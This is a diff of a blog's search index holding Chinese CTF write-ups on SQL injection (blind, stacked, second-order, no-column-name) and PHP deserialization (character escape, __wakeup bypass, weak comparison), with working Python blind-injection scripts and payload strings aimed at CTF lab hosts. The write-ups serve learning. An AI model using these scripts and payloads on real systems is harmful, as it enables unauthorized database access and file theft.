+给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0,且两个比较的列数和非比较列要相同（比如select 1,”b”中，1是非比较列，b是比较列），如果两个首字符的ascii码都相等则比较第二个字符，以此类推；如果前面的字符都相等，一个后面有字符，另一个没有字符，则有字符的大。
+
+
+6. 根据以上规律，写出盲注脚本import requestsimport timeurl = &quot;http://ad2dd0bd-164d-4573-92ac-bb267528221b.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          flag = result + chr(ascii_val)        #payload = f&quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema = database()),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        payload = f&quot;1^((select 1,&#x27;&#123;flag&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;When&quot; in r.text:            result += chr(ascii_val-1)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
+7. 先用sys.schema_table_statistics_with_buffer代替information_schema.tables库，查找到表名f1ag_1s_h3r3_hhhhh，再无列名注入查找flag
+八.[SUCTF 2019]EasySQL 堆叠注入1. 先输入1或&gt;&#x3D;1的数返回Array ( [0] &#x3D;&gt; 1 )，输入0或字符无回显，返回为空，推断可能有||结构
+||运算规则：首先0和字符为假，非0数字为真，如果第一个为真直接返回真，如果第一个为假则判断后一个，如果后一个为假则返回假，如果后一个为真则返回真
+
+2. 根据前面的返回，则判断后一个为假内容及[输入的数据] || 假，所以结构应该为 ‘select [输入的数据] || 假 from Flag’3. 所以可以用*,1绕过||运算，返回所有字段的内容
+输入*,1后，结构变为 ‘select ,1 || 假 from Flag’ 因为 ‘1||假‘&#x3D;1，所以返回所有字段的内容(包括flag)为什么是,1，而不是*,0&#x2F;字符？因为0和字符为假，0 || 假返回空无回显，无法查看flag
+
+
+4. 最终获取flag另一种方法是通过 set sql_mode 将 || 的语义强制转换为字符串连接符。执行以下两个步骤的 payload：
+首先执行 1;set sql_mode&#x3D;PIPES_AS_CONCAT;
+然后执行 select 1。
+
+这样做能将 || 从逻辑”或”运算符转换为与 Oracle 数据库兼容的字符串连接符，从而拼接并输出完整的 flag 内容。
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>我的第一篇文章</title>
     <url>/2026/03/12/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
     <content><![CDATA[Hello world!!!!]]></content>
+  </entry>
+  <entry>
+    <title>[安洵杯 2019] easy_serialize_php 反序列化字符逃逸</title>
+    <url>/2026/05/17/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[1 题目描述打开题目页面，只有一个 “source_code” 链接，点击可以看到源代码。
+2 代码审计访问 ?f=highlight_file 获取源代码：
+&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;, &#x27;flag&#x27;, &#x27;php5&#x27;, &#x27;php4&#x27;, &#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;, $filter_arr).&#x27;/i&#x27;;    return preg_replace($filter, &#x27;&#x27;, $img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);  // 变量覆盖漏洞！if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;?&gt;
+
+关键函数分析1. filter() 过滤函数
+过滤关键字：php、flag、php5、php4、fl1g，使用 preg_replace 将它们替换为空字符串。
+2. extract($_POST) 变量覆盖
+extract() 函数将 POST 数组中的键值对提取为 PHP 变量，这意味着可以通过 POST 覆盖前面的 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量。
+3. show_image 功能
+当 $function == &#39;show_image&#39; 时，会反序列化经过 filter 处理的 session 数据，然后读取 $userinfo[&#39;img&#39;] base64 解码后的文件路径。
+3 信息收集 — phpinfo访问 ?f=phpinfo，在 phpinfo 页面中发现关键信息：
+
+auto_append_file: d0g3_f1ag.php — 存在可疑 PHP 文件
+FLAG: not_flag — 不是真正的 flag
+
+由此可知 flag 很可能就在 d0g3_f1ag.php 文件中。
+4 反序列化字符逃逸原理核心漏洞点filter() 函数会对 serialize($_SESSION) 的序列化字符串进行关键字过滤，而过滤后的字符串会被 unserialize() 反序列化。
+当 filter 删除了序列化字符串中的字符，但长度标识（s:N）没有相应更新时，就会导致反序列化解析错位，从而实现字符逃逸。
+三种 POST 方式实现逃逸参考文章中给出了三种 POST 传参方式，均可以实现字符逃逸，可对比学习规律：
+方法一：利用键名 flagflag
+_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+序列化后：a:1:{s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;}&quot;，filter 删除两个 “flag” 后键名变为空，s:8 向后吞并，注入的 img 键值对被解析。
+方法二：利用键名 flagphp
+_SESSION[flagphp]=;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+filter 删除 “php,flag” 后键名变化，同样造成逃逸。
+5 构造 Payload 获取 Flag第一步：读取 d0g3_f1ag.phpd0g3_f1ag.php 的 base64 编码：
+d0g3_f1ag.php -&gt; base64_encode = ZDBnM19mMWFnLnBocA==
+
+构造 payload，利用 extract($_POST) 覆盖 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量和使后面的 $_SESSION[&#39;img&#39;]变量逃逸：
+通过字符逃逸，原本代码中设置的 img 值（guest_img.png 的 base64或sha1(base64_encode($_GET[&#39;img_path&#39;]))）被忽略，注入的 ZDBnM19mMWFnLnBocA== 成为了 img 的值。
+发送请求：
+GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+
+查看返回结果页面源代码：
+&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt;
+
+成功读取到 d0g3_f1ag.php 文件！其中提示 flag 在 /d0g3_fllllllag 文件中。
+第二步：读取 &#x2F;d0g3_fllllllag 获取 Flag/d0g3_fllllllag 的 base64 编码：
+/d0g3_fllllllag -&gt; base64_encode = L2QwZzNfZmxsbGxsbGFn
+
+构造相同结构的 payload，只替换 base64 字符串：
+GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
+
+最终获取 flag：
+6 知识点总结
+extract() 变量覆盖 — 通过 POST 数据覆盖 $_SESSION、$function、$_GET 等变量
+反序列化字符逃逸 — 利用 filter 删除关键字导致的序列化字符串长度与内容不匹配，实现反序列化注入
+PHP 反序列化容错性 — PHP 反序列化时能自动跳过无效字符继续解析，这为注入提供了可能
+
+字符逃逸的通用思路当序列化字符串经过替换&#x2F;过滤操作后，长度发生变化时：
+
+替换后变短(本题)：利用长度标识 &gt; 实际内容，向后吞并其他字段
+替换后变长：利用转义字符导致闭合提前
+
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入二</title>
+    <url>/2026/04/22/sql%E6%B3%A8%E5%85%A5%E4%BA%8C/</url>
+    <content><![CDATA[一.Post注入步骤1. 一开始先用admin万能账号与and或任意字符与or判断闭合方式和注点2. 账号和密码之间的post数据用&amp;连接起来，且都必填，如果有submit传输，则要连接submit的值3. 之后在账号或密码中注入sql语句，方式与之前字符型注入相同4. post注入一般是报错注入或盲注实例
+二.Uagent请求头注入适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时uagent请求头未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的uagent请求头3. 发送请求包，查看响应结果4.一般为报错注入实例
+三.Refer请求头注入与Uagent请求头注入相同适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时refer请求头未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的refer请求头3. 发送请求包，查看响应结果4.一般为报错注入四.cookie注入适用场景
+网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时cookie未被过滤或拦截。
+步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的cookie3. 发送请求包，查看响应结果4.一般为报错注入实例
+]]></content>
+  </entry>
+  <entry>
+    <title>斐波那契函数</title>
+    <url>/2026/03/21/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[斐波那契函数的python代码：def f(n):    n1=0    n2=1    a=1        for j in range(2,n+1):        a=n1+n2        n1 = n2        n2 = a    return f&quot;第&#123;n&#125;个斐波那契数为：&#123;a&#125;&quot;
+一.设置变量
+n1 &#x3D; 0 （n1：代表斐波那契数列的第 0 项（f(0)&#x3D;0））
+n2 &#x3D; 1 （代表第 1 项（f(1)&#x3D;1））
+a &#x3D; 1 （代表当前正在计算的项，初始值设为 1，即第 1 项的值。）
+
+注意：a 的初值在后续循环中会被覆盖，但对 n&#x3D;1 的情况，循环不执行，直接输出 a&#x3D;1，正好对应 f(1)。二. 设置循环range(2, n + 1) 生成从 2 到 n 的整数序列（包含 2，不包含 n+1 但步长为 1，所以当 n&gt;&#x3D;2 时，循环至少执行一次）。每次循环：1. a &#x3D; n1 + n2:计算当前项的值（即前两项之和）。2. n1 &#x3D; n2:将原 n2 的值赋给 n1，为下一次计算做准备（相当于前一项指针后移）。3. n2 &#x3D; a将刚计算出的当前项值赋给 n2，使之成为下一轮计算的“前一项”。循环变量 j 仅用于控制循环次数，未在循环体内使用。]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
   </entry>
   <entry>
     <title>文件上传漏洞</title>
@@ -2148,148 +2243,6 @@ user.ini文件
 ]]></content>
       <tags>
         <tag>文件上传漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>斐波那契函数</title>
-    <url>/2026/03/21/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[斐波那契函数的python代码：def f(n):    n1=0    n2=1    a=1        for j in range(2,n+1):        a=n1+n2        n1 = n2        n2 = a    return f&quot;第&#123;n&#125;个斐波那契数为：&#123;a&#125;&quot;
-一.设置变量
-n1 &#x3D; 0 （n1：代表斐波那契数列的第 0 项（f(0)&#x3D;0））
-n2 &#x3D; 1 （代表第 1 项（f(1)&#x3D;1））
-a &#x3D; 1 （代表当前正在计算的项，初始值设为 1，即第 1 项的值。）
-
-注意：a 的初值在后续循环中会被覆盖，但对 n&#x3D;1 的情况，循环不执行，直接输出 a&#x3D;1，正好对应 f(1)。二. 设置循环range(2, n + 1) 生成从 2 到 n 的整数序列（包含 2，不包含 n+1 但步长为 1，所以当 n&gt;&#x3D;2 时，循环至少执行一次）。每次循环：1. a &#x3D; n1 + n2:计算当前项的值（即前两项之和）。2. n1 &#x3D; n2:将原 n2 的值赋给 n1，为下一次计算做准备（相当于前一项指针后移）。3. n2 &#x3D; a将刚计算出的当前项值赋给 n2，使之成为下一轮计算的“前一项”。循环变量 j 仅用于控制循环次数，未在循环体内使用。]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[极客大挑战 2019]PHP,wakeup绕过</title>
-    <url>/2026/05/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-wakeup%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[进入题目，就有页面提示“所以我有一个良好的备份网站的习惯”,是所以网站可能存在网站源码备份
-常见的网站源码备份文件后缀:tar.gz，zip，rar，tar常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp
-
-一个个组合尝试后,发现www.zip可以成功获得网站源码备份下载有4个文件
-访问一下index.php文件：&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;
-发现文件包含 class.php 文件 并且文件是get  传参，参数为 select访问class.php文件：&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;
-发现php文件中包含 flag.php并且 设置两个私有变量 ，利用 __construct 构造函数  来进行一个一一对应的关系之后__wakeup() 让 username 变量等于 guest在类 结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username…,password… ，退出函数。如果 username&#x3D; admin 就会输出 flag 否则 失败。在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以要想办法绕过该函数， 并且在一开始要给username的赋值为admin
-当成员属性数目大于实际数目时可绕过wakeup方法
-
-构造payload&lt;?phpclass Name&#123;    private $username = &#x27;admine&#x27;;    private $password = &#x27;100&#x27;;    &#125; $select = new Name(); $res=serialize(@$select);    echo $res?&gt;
-得到序列化字符串
-O:4:”Name”:2:{s:14:”口Name口username”;s:6:”admine”;s:14:”口Name口password”;s:3:”100”;}
-
-将空字符替换为%00
-O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}
-
-get传输序列化payload，得到flag
-]]></content>
-      <tags>
-        <tag>解题wp</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[网鼎杯 2020 青龙组]AreUSerialz(反序列化，弱比较)</title>
-    <url>/2026/05/17/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%BC%B1%E6%AF%94%E8%BE%83/</url>
-    <content><![CDATA[题目分析题目概述本题是一道典型的 PHP 反序列化漏洞题目，主要考察对 PHP 反序列化机制和比较运算符的理解。
-关键代码&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;    &#125;    function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;?&gt;
-
-漏洞分析核心漏洞：比较运算符不一致这是本题的关键漏洞！代码中存在比较运算符不一致的问题：
-
-__destruct() 使用严格比较：$this-&gt;op === &quot;2&quot;
-process() 使用非严格比较：$this-&gt;op == &quot;2&quot;
-
-漏洞原理在 PHP 中：
-
-严格比较 ===：要求值和类型都相同
-非严格比较 ==：只要求值相同，会进行类型转换
-
-
-
-
-比较表达式
-结果
-原因
-
-
-
-2 === &quot;2&quot;
-false
-类型不同（整数 vs 字符串）
-
-
-2 == &quot;2&quot;
-true
-值相同（都会转换为数字2）
-
-
-利用思路需要构造一个反序列化 payload，使得：
-
-__destruct() 中 $this-&gt;op === &quot;2&quot; 返回 false（不修改 op 值）
-process() 中 $this-&gt;op == &quot;2&quot; 返回 true（执行 read 方法）
-
-Payload 构造方法一：使用整数类型的 opO:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
-
-解释：
-
-O:11:&quot;FileHandler&quot;：反序列化为 FileHandler 对象
-s:2:&quot;op&quot;;i:2：设置 op 为整数 2（不是字符串 “2”）
-s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;：设置要读取的文件为 flag.php
-
-方法二：使用公共属性覆盖（无需前缀）由于代码直接访问 $this-&gt;op，我们可以使用公共属性名称，不需要 %00*%00 前缀：
-// 类中定义的是 protected $op// 但我们可以直接使用 &quot;op&quot; 创建公共属性O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
-
-原理：当反序列化时创建公共属性 $op，PHP 会优先访问公共属性。
-完整利用过程1. 发送 Payload?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
-
-2. 执行流程反序列化 → 对象创建 → __destruct() 调用        ↓$this-&gt;op = 2 (整数)        ↓$this-&gt;op === &quot;2&quot; → false (严格比较失败)        ↓$this-&gt;content = &quot;&quot;        ↓process() 调用        ↓$this-&gt;op == &quot;2&quot; → true (非严格比较成功)        ↓read() 执行，读取 flag.php        ↓output() 输出文件内容
-
-3. 获取 Flag
-执行后并没有显示 flag 内容，说明文件没有直接输出flag,而是把flag设置在变量里可以把payload中的filename改为php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php,获得文件的base64编码
-
-
-
-然后解码得到flag
-
-
-技术要点总结1. PHP 反序列化属性访问优先级
-
-
-属性类型
-访问优先级
-序列化格式
-
-
-
-公共属性
-最高
-属性名
-
-
-protected
-次之
-\x00*\x00属性名
-
-
-private
-最低
-\x00类名\x00属性名
-
-
-2. 比较运算符差异// 严格比较（类型+值）$a === $b// 非严格比较（仅值）$a == $b
-
-3. is_valid 函数绕过function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;
-
-该函数只检查可打印 ASCII 字符（32-125），我的 payload 完全由可打印字符组成，因此可以顺利通过检查。
-Flagflag&#123;feff0449-1519-4e96-a316-c09b469eb5d6&#125;
-
-总结本题的核心在于比较运算符不一致导致的漏洞。通过巧妙构造反序列化 payload，利用整数和字符串的弱比较特性，成功绕过了 __destruct() 的限制，最终读取了 flag 文件。
-]]></content>
-      <tags>
-        <tag>解题wp</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -2431,84 +2384,29 @@ finditer函数返回一个迭代器，每次迭代产生一个匹配对象，适
       </tags>
   </entry>
   <entry>
-    <title>sql注入题目合集</title>
-    <url>/2026/05/01/sql%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/</url>
-    <content><![CDATA[一.[极客大挑战 2019]BabySQL 基础的注入题目一开始先使用万能密码1‘ or 1&#x3D;1查看登录成功后的回显位置
-这里报错可判断出or被过滤了，再尝试双写绕过过滤
-这里登录成功了，说明可用双写绕过，再查看列数和回显
-这里报错判断select或union或都被过滤了，再使用双写绕过过滤
-查看出列数为3列，注点为2和3。这道题会显示报错，先出尝试使用报错注入。注入途中发现substr,from,information,where也被过滤，使用双写绕过。
-最后注入成功，查看出表名，然后依次查找出列名，列里的flag
-最后使用substr函数提取出完整的flag
-二.[极客大挑战 2019]LoveSQL 基础的注入题目原理与babysql一样，不过没有函数过滤，不需要双写绕过，直接报错注入即可拿到flag三.[CISCN2019 华北赛区 Day2 Web1]Hack World开局先用1‘ or 1&#x3D;1万能账号查看，发现有sql语句过滤机制
-用sql字典爆破查看被过滤的sql语句，发现空格,&#x2F;**&#x2F;,or,and,–+,#,union,还有一些报错注入的函数都被过滤了，无法使用联合注入和报错注入，优先考虑盲注
-因or和and被过滤，所以可使用异或符^来判断页面两种不同的状态
-因为真为1，假为0，且1^1&#x3D;0，1^0&#x3D;1,所以括号中条件为真时，页面输出Error Occured When Fetch Result.当括号中条件为假时，页面输出Hello, glzjin wants a girlfriend.可根据这两种输出盲注写出盲注脚本import requestsimport timeurl = &quot;http://9fa0f800-14a7-4413-a377-9a5266bf3592.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          payload = f&quot;1^(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;Error&quot; in r.text:            result += chr(ascii_val)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
-注意1. 脚本中使用了time.sleep(0.1)，是为了避免请求频率过高，导致服务器繁忙请求失败，从而使得到的flag残缺2. 脚本中使用了session.Session()是为了保持会话状态，避免每次请求都重新登录，导致注入失败执行脚本，获取flag
-四.[b01lers2020]Life on Mars进入题目后无法直接获取get或post参数的变量名，抓包查看信息
-发现get参数search，且只要地址正确，就会返回以下页面、
-用order by注入查看字段数,发现字段为2时，页面正常显示
-再使用union联合注入查看回显位置
-发现回显位置在最末尾，再查看所有库名
-选择一个库，依次查看表名，列名和列内容
-这里刚好得到了flag，如果没有就换一个库或列继续查找五.October 2019 Twice SQL Injection考察知识
-二次注入
+    <title>[极客大挑战 2019]PHP,wakeup绕过</title>
+    <url>/2026/05/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-wakeup%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[进入题目，就有页面提示“所以我有一个良好的备份网站的习惯”,是所以网站可能存在网站源码备份
+常见的网站源码备份文件后缀:tar.gz，zip，rar，tar常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp
 
-先随便注册一个账号，进行登录，输入sql语句查看过滤情况，发现没有过滤，但是单引号用\转义了，初步判断为二次注入
-尝试注册用户名为：1’ union select database()# 的账号，登录后发现回显数据库名
-进一步注入，注册用户名为：1’ union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# 的账号，登录后回显表名
-把sql注入语句注册为用户名，依次查找列名和列内容，最终获取flag
-六.[CISCN2019 华北赛区 Day1 Web5]CyberPunk考察知识
-二次注入，php伪协议
+一个个组合尝试后,发现www.zip可以成功获得网站源码备份下载有4个文件
+访问一下index.php文件：&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;
+发现文件包含 class.php 文件 并且文件是get  传参，参数为 select访问class.php文件：&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;
+发现php文件中包含 flag.php并且 设置两个私有变量 ，利用 __construct 构造函数  来进行一个一一对应的关系之后__wakeup() 让 username 变量等于 guest在类 结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username…,password… ，退出函数。如果 username&#x3D; admin 就会输出 flag 否则 失败。在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以要想办法绕过该函数， 并且在一开始要给username的赋值为admin
+当成员属性数目大于实际数目时可绕过wakeup方法
 
-先查看源码，发现页面源代码末尾有提示file传参
-使用php伪协议读取php文件源码的base64编码,再解码
-依次拿到提交订单，修改订单，查看订单，删除订单的php源码，发现修改订单的代码中存在注入漏洞
-$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];#old_address没有被过滤，直接作用再sql语句中，所以可以在address中注入sql语句，然后通过修改订单使sql语句生效，最后通过查看订单回显sql语句的执行结果
-查看库名
-在地址中输入：’,’address’&#x3D;(select group_concat(schema_name) from information_schema.schemata)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+构造payload&lt;?phpclass Name&#123;    private $username = &#x27;admine&#x27;;    private $password = &#x27;100&#x27;;    &#125; $select = new Name(); $res=serialize(@$select);    echo $res?&gt;
+得到序列化字符串
+O:4:”Name”:2:{s:14:”口Name口username”;s:6:”admine”;s:14:”口Name口password”;s:3:”100”;}
 
+将空字符替换为%00
+O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}
 
-查看ctftraining库的表名
-在地址中输入：’,’address’&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctftraining’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
-
-
-查看列名
-在地址中输入：’,’address’&#x3D;(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’ctftraining’ and table_name&#x3D;’FLAG_TABLE’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
-
-
-查看列内容
-在地址中输入：’,’address’&#x3D;(select * from FLAG_COLUMN)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
-
-发现值为空，没有flag，被骗了，再尝试查看文件目录是否有flag文件
-在地址中输入：’,’address’&#x3D;(select(load_file(‘&#x2F;flag.txt’)))#再修改地址使sql语句生效，最后查看订单回显sql执行结果
-
-
-最终获取flag七.[GYCTF2020]Ezsqli 无列名注入考察知识
-布尔盲注，无列名注入
-
